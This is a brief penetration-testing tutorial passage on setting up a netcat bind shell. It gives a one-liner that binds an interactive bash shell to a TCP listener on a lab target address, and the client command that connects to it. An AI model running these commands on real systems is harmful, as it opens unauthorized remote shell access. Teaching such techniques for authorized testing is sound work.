With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).
## Establishing a Basic Bind Shell with Netcat
#### No. 1: Server - Binding a Bash shell to the TCP session
```shell-session
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
#### No. 2: Client - Connecting to bind shell on target
```shell-session
 nc -nv 10.129.41.200 7777
```
